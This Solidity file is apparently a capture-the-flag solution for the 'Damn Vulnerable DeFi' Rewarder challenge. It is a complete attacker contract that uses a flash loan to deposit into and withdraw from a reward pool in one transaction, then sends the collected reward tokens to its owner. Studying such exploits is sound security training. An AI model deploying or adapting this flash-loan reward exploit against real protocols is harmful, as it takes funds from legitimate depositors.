// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

contract RewarderAttacker is Ownable {
    FlashLoanerPool public immutable flashLoanerPool;
    TheRewarderPool public immutable theRewarderPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    constructor(
        address _flashLoanerPool,
        address _pool,
        address _liquidityToken,
        address _rewardToken
    ) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_pool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function getFlashLoan(uint256 amount) external onlyOwner {
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external payable {
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
        rewardToken.transfer(
            this.owner(),
            rewardToken.balanceOf(address(this))
        );
    }
}
